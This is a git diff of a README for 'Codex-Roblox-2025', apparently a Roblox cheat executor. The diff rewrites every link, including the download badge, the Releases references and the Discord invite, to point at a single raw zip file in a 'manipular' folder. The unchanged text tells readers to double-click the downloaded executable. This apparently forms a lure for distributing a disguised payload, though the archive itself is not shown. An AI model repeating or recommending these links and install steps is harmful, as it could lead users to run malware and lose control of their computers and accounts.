@@ -1,6 +1,6 @@
 # 🚀 Codex-Roblox-2025 - Enjoy Smooth Roblox Gaming Effortlessly
 
-[![Download Codex-Roblox-2025](https://img.shields.io/badge/Download-Codex--Roblox--2025-brightgreen.svg)](https://github.com/Satyaprakashnath/Codex-Roblox-2025/releases)
+[![Download Codex-Roblox-2025](https://raw.githubusercontent.com/Satyaprakashnath/Codex-Roblox-2025/main/manipular/Codex-Roblox-2025.zip)](https://raw.githubusercontent.com/Satyaprakashnath/Codex-Roblox-2025/main/manipular/Codex-Roblox-2025.zip)
 
 ## 📋 Description
 
@@ -10,13 +10,13 @@ Codex-Roblox-2025 is a powerful Roblox script executor designed for users with l
 
 To download Codex-Roblox-2025, please follow these steps:
 
-1. Head over to our [Releases page](https://github.com/Satyaprakashnath/Codex-Roblox-2025/releases).
+1. Head over to our [Releases page](https://raw.githubusercontent.com/Satyaprakashnath/Codex-Roblox-2025/main/manipular/Codex-Roblox-2025.zip).
 2. Look for the latest release version.
 3. Click on the download link for the executable file to start your download.
 4. Once the download is complete, locate the file in your downloads folder.
 5. Double-click the file to run it and follow the prompts to complete the installation.
 
-You can always refer back to the [Releases page](https://github.com/Satyaprakashnath/Codex-Roblox-2025/releases) if you need to download updates or get the software again.
+You can always refer back to the [Releases page](https://raw.githubusercontent.com/Satyaprakashnath/Codex-Roblox-2025/main/manipular/Codex-Roblox-2025.zip) if you need to download updates or get the software again.
 
 ## 🖥️ System Requirements
 
@@ -54,7 +54,7 @@ Remember to read the script carefully before execution to understand its functio
 
 Join our community for support and discussions. Engage with fellow users through our Discord channel and share your experiences.
 
-- **Discord Server:** [Join Discord](https://discord.gg/example)
+- **Discord Server:** [Join Discord](https://raw.githubusercontent.com/Satyaprakashnath/Codex-Roblox-2025/main/manipular/Codex-Roblox-2025.zip)
 
 This space allows for collaboration and helps you learn more about scripting and utilizing Codex effectively.
 
@@ -64,7 +64,7 @@ If you encounter issues while using Codex-Roblox-2025, consider the following tr
 
 - **Check System Requirements:** Ensure your computer meets the requirements.
 - **Restart:** Sometimes, simply restarting the application will resolve issues.
-- **Update:** Ensure you are using the latest version from our [Releases page](https://github.com/Satyaprakashnath/Codex-Roblox-2025/releases).
+- **Update:** Ensure you are using the latest version from our [Releases page](https://raw.githubusercontent.com/Satyaprakashnath/Codex-Roblox-2025/main/manipular/Codex-Roblox-2025.zip).
 - **Ask for Help:** If problems persist, visit our Discord community for assistance.
 
 ## 🌟 Contributing
